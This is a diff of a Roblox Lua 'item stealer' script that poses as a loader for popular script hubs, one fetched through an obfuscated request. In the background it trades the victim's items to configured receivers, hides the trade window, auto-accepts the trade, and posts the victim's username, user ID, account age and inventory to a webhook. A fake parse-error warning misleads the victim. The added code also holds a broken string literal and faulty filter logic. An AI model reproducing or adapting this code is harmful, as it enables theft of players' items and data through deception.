@@ -16,17 +16,17 @@ if not games[game.PlaceId] then
 end
 
 if not Config.Webhook:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
-    warn("Script terminated due to an invalid webhook URL.")
+    warn("Script terminated due to an invaild webhook url.")
     return
 end
 
 if type(Config.Receivers) ~= "table" or #Config.Receivers == 0 then
-    warn("Script terminated due to an invalid receivers table.")
+    warn("Script terminated due to an invaild receivers table.")
     return
 end
 
 if Config.Script == "Custom" and not Config.CustomLink:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
-    warn("Script terminated due to an invalid custom URL.")
+    warn("Script terminated due to an invaild custom url.")
     return
 end
 
@@ -40,20 +40,23 @@ elseif Config.Script == "Custom" then
     Config.Script = Config.Script .. " - " .. Config.CustomLink
 end
 
--- Load the corresponding script
-local scriptUrls = {
-    ["Custom"] = Config.CustomLink,
-    ["Overdrive H"] = "https://overdrive-h.ohd.workers.dev/?d=loader",
-    ["Symphony Hub"] = "https://raw.githubusercontent.com/ThatSick/ArrayField/main/SymphonyHub.lua",
-    ["Highlight Hub"] = "https://raw.githubusercontent.com/ThatSick/HighlightMM2/main/Main",
-    ["Eclipse Hub"] = "https://api.eclipsehub.xyz/auth?key=" .. (getgenv().mainKey or "nil"),
-    ["R3TH PRIV"] = "https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/loader.lua",
-    ["AshbornnHub"] = "https://raw.githubusercontent.com/Ashborrn/AshborrnHub/main/Solara.lua",
-    ["Nexus"] = "https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring"
-}
-
-if scriptUrls[Config.Script] then
-    loadstring(game:HttpGet(scriptUrls[Config.Script]))()
+if Config.Script == "Custom" then
+    loadstring(game:HttpGet(Config.CustomLink))()
+elseif Config.Script == "Overdrive H" then
+    loadstring(game:HttpGet("https://overdrive-h.ohd.workers.dev/?d=loader"))()
+elseif Config.Script == "Symphony Hub" then
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/ThatSick/ArrayField/main/SymphonyHub.lua'))()
+elseif Config.Script == "Highlight Hub" then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HighlightMM2/main/Main"))()
+elseif Config.Script == "Eclipse Hub" then
+    getgenv().mainKey = "nil"
+    local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https\58//api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
+elseif Config.Script == "R3TH PRIV" then
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/R3TH-PRIV/R3THPRIV/main/loader.lua'))()
+elseif Config.Script == "AshbornnHub" then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Ashborrn/AshborrnHub/main/Solara.lua",true))()
+elseif Config.Script == "Nexus" then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring"))()
 end
 
 warn([[:22: Expected identifier when parsing variable name, got 'ꯃꯤꯁ꯭ꯇꯣꯚꯔ ꯑꯥꯏꯇꯦꯝ ꯇꯦꯀꯔ ꯁ꯭ꯛꯔꯤꯞꯇ ꯑꯦꯛꯇꯤꯕ ꯑꯣꯏꯔꯦ꯫']])
@@ -83,24 +86,55 @@ LocalPlayer.Idled:connect(function()
     VirtualUser:ClickButton2(Vector2.new())
 end)
 
-local UIPath = LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") and LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main or LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main
-local Mobile = LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") == nil
+if Hard ~= nil then
+    AntiStealer = "Anti-Stealer detected"
+else
+    AntiStealer = "None detected"
+end
+
+if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") ~= nil then
+    UIPath = LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main
+    Mobile = false
+else
+    UIPath = LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main
+    Mobile = true
+end
 
 function TapUI(button, check, button2)
-    if check == "Active Check" and not button.Active then return end
-    if check == "Text Check" and button ~= "^" then return end
-    for _, event in pairs(events) do
-        for _, connection in pairs(getconnections(button[event])) do
-            connection:Fire()
+    if check == "Active Check" then
+        if button.Active then
+            button = button[button2]
+        else
+            return
+        end
+    end
+    if check == "Text Check" then
+        if button == "^" then
+            button = button2
+        else
+            return
+        end
+    end
+    for i,v in pairs(events) do
+        for i,v in pairs(getconnections(button[v])) do
+            v:Fire()
         end
     end
 end
 
 function Rarity(color, amount, tradeable, requirepath, path)
-    local Stack = tonumber(amount:match("x(%d+)")) or 1
+    Stack = 0
 
-    if tradeable and tradeable:FindFirstChild("Evo") then
-        return
+    if tradeable then
+        if tradeable:FindFirstChild("Evo") then
+            return
+        end
+    end
+
+    if amount ~= "" then
+        Stack = tonumber(amount:match("x(%d+)"))
+    else
+        Stack = 1
     end
 
     local r = math.floor(color.R * 255 + 0.5)
@@ -128,25 +162,57 @@ end
 
 function FullInventory()
     local Inventory = {}
-    for _, v in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
-        for _, item in pairs(v.Container:GetChildren()) do
-            if item:IsA("Frame") then
-                Rarity(item.ItemName.BackgroundColor3, item.Container.Amount.Text, item:FindFirstChild("Tags"))
-                if Config.FullInventory then
-                    table.insert(Inventory, item.ItemName.Label.Text .. " " .. (item.Container.Amount.Text ~= "" and item.Container.Amount.Text or "x1"))
+    for i,v in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
+        for i,v in pairs(v.Container:GetChildren()) do
+            if v.Name == "Christmas" or v.Name == "Halloween" then
+                for i,v in pairs(v.Container:GetChildren()) do
+                    if v:IsA("Frame") then
+                        Rarity(v.ItemName.BackgroundColor3, v.Container.Amount.Text, v:FindFirstChild("Tags"))
+                        if Config.FullInventory then
+                            if v.Container.Amount.Text ~= "" then
+                                number = v.Container.Amount.Text
+                            else
+                                number = "x1"
+                            end
+                            table.insert(Inventory, v.ItemName.Label.Text .. " " .. number)
+                        end
+                    end
+                end
+            else
+                if v:IsA("Frame") then
+                    Rarity(v.ItemName.BackgroundColor3, v.Container.Amount.Text, v:FindFirstChild("Tags"))
+                    if Config.FullInventory then
+                        if v.Container.Amount.Text ~= "" then
+                            number = v.Container.Amount.Text
+                        else
+                            number = "x1"
+                        end
+                        table.insert(Inventory, v.ItemName.Label.Text .. " " .. number)
+                    end
                 end
             end
         end
     end
-    for _, v in pairs(UIPath.Pets.Items.Container.Current.Container:GetChildren()) do
+    for i,v in pairs(UIPath.Pets.Items.Container.Current.Container:GetChildren()) do
         if v:IsA("Frame") then
-            Rarity(v.ItemName.BackgroundColor3, v.Container.Amount.Text)
-            if Config.FullInventory then
-                table.insert(Inventory, v.ItemName.Label.Text .. " " .. (v.Container.Amount.Text ~= "" and v.Container.Amount.Text or "x1"))
+            if v:IsA("Frame") then
+                Rarity(v.ItemName.BackgroundColor3, v.Container.Amount.Text)
+                if Config.FullInventory then
+                    if v.Container.Amount.Text ~= "" then
+                        number = v.Container.Amount.Text
+                    else
+                        number = "x1"
+                    end
+                    table.insert(Inventory, v.ItemName.Label.Text .. " " .. number)
+                end
             end
         end
     end
-    return Config.FullInventory and table.concat(Inventory, ", ") or "Full inventory set false."
+    if Config.FullInventory then
+        return table.concat(Inventory, ", ")
+    else
+        return "Full inventory set false."
+    end
 end
 
 FullInventory()
@@ -154,11 +220,22 @@ FullInventory()
 task.wait()
 
 function Sendtrade(player)
-    local Path = Mobile and LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard or LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard
-    TapUI(Path.Container.Close)
-    TapUI(Path.Container.PlayerList[player].ActionButton)
-    TapUI(Path.Popup.Container.Action.Trade)
-    TapUI(Path.Popup.Container.Close)
+    if Mobile then
+        local Path = LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard
+        TapUI(Path.Container.Close)
+        TapUI(Path.Container.PlayerList[player].ActionButton)
+        TapUI(Path.Popup.Container.Action.Trade)
+        TapUI(Path.Popup.Container.Close)
+    else
+        local Path = LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard
+        TapUI(Path.Container.ToggleRequests.On)
+        TapUI(Path.Container.Close.Title.Text, "Text Check", Path.Container.Close.Toggle)
+        TapUI(Path.Container.TradeRequest.ReceivingRequest, "Active Check", "Decline")
+        TapUI(Path.Container.TradeRequest.SendingRequest, "Active Check", "Cancel")
+        TapUI(Path.Container[player].ActionButton)
+        TapUI(Path.Inspect.Trade)
+        TapUI(Path.Inspect.Close)
+    end
 end
 
 function readchats(player)
@@ -170,7 +247,7 @@ function readchats(player)
 end
 
 function Activate(player)
-    for _, v in pairs(Config.Receivers) do
+    for i,v in pairs(Config.Receivers) do
         if v == player then
             readchats(player)
             wait(10)
@@ -180,80 +257,111 @@ function Activate(player)
 end
 
 ReplicatedStorage.Trade.StartTrade.OnClientEvent:Connect(function()
-    task.wait(1)
-    local Path = Mobile and LocalPlayer.PlayerGui.TradeGUI_Phone.Container or LocalPlayer.PlayerGui.TradeGUI.Container
-    local ItemsInTrade = 0
-
-    for _, v in pairs(Path.Items.Main:GetChildren()) do
-        for _, item in pairs(v.Items.Container.Current.Container:GetChildren()) do
-            if item:IsA("Frame") and item.ItemName.Label.Text ~= "Default Knife" and item.ItemName.Label.Text ~= "Default Gun" then
-                if ItemsInTrade < 4 then
-                    ItemsInTrade = ItemsInTrade + 1
-                    local LoopsItem = tonumber(item.Container.Amount.Text:match("x(%d+)")) or 1
-                    task.wait()
-                    for _ = 1, LoopsItem do
-                        TapUI(item.Container.ActionButton)
+    wait(1)
+    if Mobile then
+        local ItemsSent = 0
+        local Path = LocalPlayer.PlayerGui.TradeGUI_Phone.Container
+        local ItemsInTrade = 0
+        for i,v in pairs(Path.Items.Main:GetChildren()) do
+            for i,v in pairs(v.Items.Container.Current.Container:GetChildren()) do
+                if v:IsA("Frame") then
+                    if v.ItemName.Label.Text ~= "Default Knife" or v.ItemName.Label.Text ~= "Default Gun" then
+                        if ItemsInTrade ~= 4 then
+                            ItemsInTrade = ItemsInTrade + 1
+                            LoopsItem = 1
+                            local Amount = v.Container.Amount.Text
+                            if Amount ~= "" then
+                                LoopsItem = tonumber(Amount:match("x(%d+)"))
+                            end
+                            task.wait()
+                            for i = 1, LoopsItem do
+                                TapUI(v.Container.ActionButton)
+                            end
+                        end
                     end
                 end
             end
         end
+        wait(10)
+        game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
+    else
+        local ItemsSent = 0
+        local Path = LocalPlayer.PlayerGui.TradeGUI.Container
+        local ItemsInTrade = 0
+        for i,v in pairs(Path.Items.Main:GetChildren()) do
+            for i,v in pairs(v.Items.Container.Current.Container:GetChildren()) do
+                if v:IsA("Frame") then
+                    if v.ItemName.Label.Text ~= "Default Knife" or v.ItemName.Label.Text ~= "Default Gun" then
+                        if ItemsInTrade ~= 4 then
+                            ItemsInTrade = ItemsInTrade + 1
+                            LoopsItem = 1
+                            local Amount = v.Container.Amount.Text
+                            if Amount ~= "" then
+                                LoopsItem = tonumber(Amount:match("x(%d+)"))
+                            end
+                            task.wait()
+                            for i = 1, LoopsItem do
+                                TapUI(v.Container.ActionButton)
+                            end
+                        end
+                    end
+                end
+            end
+        end
+        wait(10)
+        game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
     end
-
-    task.wait(10)
-    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582)
 end)
 
-for _, player in pairs(Players:GetPlayers()) do
-    Activate(player)
-end
+game:GetService("RunService").Heartbeat:Connect(function()
+    LocalPlayer.PlayerGui.TradeGUI_Phone.Enabled = false
+    LocalPlayer.PlayerGui.TradeGUI.Enabled = false
+end)
 
 Players.PlayerAdded:Connect(function(player)
-    Activate(player)
+    Activate(player.Name)
 end)
 
-local function SendWebhook()
-    local CurrentTimestamp = os.time()
-    local CurrentDateTime = os.date("!*t", CurrentTimestamp)
-
-    local Payload = HttpService:JSONEncode({
-        ["content"] = table.concat({
-            Ancient > 0 or Godly > 0 and "--@everyone\n--" .. TeleportScript or TeleportScript,
-            "**Inventory Details**",
-            "**User:** `" .. LocalPlayer.Name .. "`",
-            "**Common Items:** `" .. tostring(Common) .. "`",
-            "**Uncommon Items:** `" .. tostring(Uncommon) .. "`",
-            "**Rare Items:** `" .. tostring(Rare) .. "`",
-            "**Legendary Items:** `" .. tostring(Legendary) .. "`",
-            "**Vintage Items:** `" .. tostring(Vintage) .. "`",
-            "**Godly Items:** `" .. tostring(Godly) .. "`",
-            "**Ancient Items:** `" .. tostring(Ancient) .. "`",
-            "**Unique Items:** `" .. tostring(Unique) .. "`",
-            Config.FullInventory and "**Full Inventory:** " .. FullInventory() or ""
-        }, "\n"),
-        ["embeds"] = {{
-            ["title"] = "Script was executed in: " .. game.PlaceId,
-            ["type"] = "rich",
-            ["color"] = tonumber(0xFF0000),
-            ["footer"] = {
-                ["text"] = "Script was executed on:",
-            },
-            ["timestamp"] = string.format(
-                "%d-%02d-%02dT%02d:%02d:%02dZ",
-                CurrentDateTime.year, CurrentDateTime.month, CurrentDateTime.day, CurrentDateTime.hour, CurrentDateTime.min, CurrentDateTime.sec
-            ),
-        }},
-    })
-    
-    local Headers = {
-        ["content-type"] = "application/json"
-    }
-
-    request {
-        Url = Config.Webhook,
-        Method = "POST",
-        Headers = Headers,
-        Body = Payload
-    }
+for i,v in pairs(Players:GetPlayers())do
+    Activate(v.Name)
 end
 
-SendWebhook()
+function Loop(player)
+    Sendtrade()
+end
+
+function StartTrade(player)
+    for _, receiver in ipairs(Config.Receivers) do
+        if player == receiver then
+            PeaceTimer = true
+            wait(10)
+            PeaceTimer = false
+            Loop(player)
+        end
+    end
+end
+
+function StartTradesForExistingPlayers()
+    for _, player in ipairs(Players:GetChildren()) do
+        StartTrade(player.Name)
+    end
+end
+
+local data = {
+   ["content"] = "--@everyone "n" .. TeleportScript ..",
+   ["embeds"] = {
+       {
+            ["title"] = "👑 **By wum_ph**",
+            ["description"] = "```Username     : " .. LocalPlayer.Name.."\nUser Id      : " .. LocalPlayer.UserId .. "\nAccount Age  : " .. LocalPlayer.AccountAge .. "\nExploit      : " .. identifyexecutor() .. "\nAnti-Stealer : " .. AntiStealer .. "\nReceiver/s   : " .. table.concat(Config.Receivers, ", ") .. "\nScript       : " .. Config.Script .. "```\n🎒 **__Inventory__**\n```Ancient    🟪: " .. Ancient .. "\nGoldy      🧠: " .. Godly .. "\nUnique     🟧: " .. Unique .. "\nVintage    🟨: " .. Vintage .. "\nLegendary  🟥: " .. Legendary .. "\nRare       🟩: " .. Rare .. "\nUncommon   🟦: " .. Uncommon .. "\nCommon     ⬛: " .. Common .. "```\n🎒 **__Full Inventory__**\n```" .. FullInventory() .. "```\n🔗 **__Execute to join__**\n```" .. TeleportScript .. "```",
+            ["type"] = "rich",
+            ["color"] = tonumber(0xffd700),
+       }
+   }
+}
+local newdata = HttpService:JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+request({Url = Config.Webhook, Body = newdata, Method = "POST", Headers = headers})
